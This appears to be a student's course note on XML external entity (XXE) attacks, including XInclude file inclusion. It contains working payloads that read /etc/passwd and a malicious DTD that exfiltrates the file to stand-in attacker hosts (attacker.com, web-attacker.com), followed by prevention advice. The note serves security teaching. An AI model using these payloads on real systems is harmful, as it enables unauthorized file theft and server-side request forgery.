📖 **XXE via XInclude**

### 🔑 **Summary**

**XXE Injection** is a vulnerability that occurs when an application processes user-controlled XML data without proper validation. Attackers can exploit this vulnerability to read sensitive files from the server, perform server-side request forgery (SSRF), and potentially execute denial-of-service (DoS) attacks. This is significant because XML parsers can handle external entities, leading to unauthorized data access or remote interactions.

---

### 📚 **Definition Bank**

- **XML (Extensible Markup Language):** A markup language used for encoding documents in a format readable by both humans and machines.
    
- **External Entity:** A reference in an XML document that points to an external source, such as a file or URL.
    
- **Blind XXE:** An attack where the response doesn't reveal data directly but can still be exfiltrated through out-of-band techniques.
    
- **SSRF (Server-Side Request Forgery):** An attack where the server makes unauthorized requests to internal resources on behalf of the attacker.
    
- **Namespace:** A collection of XML elements and attributes identified by a unique URI.
    

---

### 📦 **XInclude Attack Summary**

**What is XInclude?**  
XInclude (XML Inclusions) allows you to pull external resources (like files) into an XML document using the `<xi:include>` tag.

---

**Key Components:**

1. **Namespace Declaration (Required)**
    
    ```xml
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    ```
    
    - This **activates** the XInclude feature in XML.
    - The URL `"http://www.w3.org/2001/XInclude"` is **not a link** but a **label** for the XML parser to recognize XInclude functionality.
2. **File Inclusion Payload:**
    
    ```xml
    <xi:include parse="text" href="file:///etc/passwd"/>
    ```
    
    - **`href`** specifies the file to retrieve (`/etc/passwd` in this case).
    - **`parse="text"`** ensures the file content is returned as plain text.

---

**How the Attack Works:**

1. The namespace (`xmlns:xi`) **enables** the use of `<xi:include>`.
2. The payload with `href="file:///etc/passwd"` tries to load a local file.
3. If successful, the server returns the file content in the response.

---

✅ **Key Insight:**

- The **namespace activates the feature**, while the **`href`** specifies the target file.
- Without the namespace, the XML parser won't understand the `<xi:include>` tag.

### 🧠 **Key Concepts with Examples**

#### **1. Basic XXE Payload:**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<foo>&file;</foo>
```

**Explanation:** This payload declares an external entity `file` that references the `/etc/passwd` file. When the XML parser processes `&file;`, it includes the contents of the file in the response.

#### **2. Blind XXE with Data Exfiltration:**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com?data=%file;'>">
%eval;]>
<data>&exfiltrate;</data>
```

**Explanation:** This payload loads `/etc/passwd` and attempts to send the data to an external server controlled by the attacker.

---

### 🛠️ **Exploiting Blind XXE to Exfiltrate Data Out-of-Band**

Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn't actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.

**Example of a malicious DTD:**

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

This DTD performs the following steps:

- Defines an XML parameter entity called `file`, containing the contents of `/etc/passwd`.
    
- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's server containing the value of the file entity within the URL query string.
    
- Uses the `eval` entity, causing the dynamic declaration of the `exfiltrate` entity to be performed.
    
- Uses the `exfiltrate` entity, causing the contents of `/etc/passwd` to be exfiltrated.
    

**Hosting the Malicious DTD:** The attacker must host this DTD on a system they control, such as:

```
http://web-attacker.com/malicious.dtd
```

**XXE Payload Example:**

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

This payload will cause the XML parser to fetch the external DTD from the attacker's server and execute the steps defined in the malicious DTD, exfiltrating the `/etc/passwd` file.

**Note:** Some XML parsers may block newline characters, which can break the attack. Alternative methods such as using the FTP protocol or targeting files like `/etc/hostname` might be required.

---

### 📊 **Comparison Table: Secure vs Insecure Practices**

|**Secure Practice**|**Insecure Practice**|
|---|---|
|Use **SAX** or **StAX** parsers|Use **DOM** parsers (more vulnerable)|
|Disable external entity loading|Allow external entity loading|
|Use `secure processing` mode|Default XML parser settings|
|Validate and sanitize input|Process untrusted XML directly|

---

### ✅ **Best Practices for Preventing XXE Attacks**

- **Disable External Entity Processing:** Ensure the XML parser does not process external entities.
    
- **Use Safer Parsers:** Choose parsers like SAX and StAX over DOM.
    
- **Input Validation:** Properly validate and sanitize all XML inputs.
    
- **Implement Least Privilege:** Limit the server's file system access.
    
- **Use Security Libraries:** Consider libraries like `defusedxml` in Python.
    

---

### 📌 **Conclusion**

XXE vulnerabilities can lead to severe security issues such as data breaches and server-side request forgery. Following best practices like disabling external entities and using secure parsers can help protect against these attacks.

---

### 🏷️ #XXE #WebSecurity #CourseNotes #PenTesting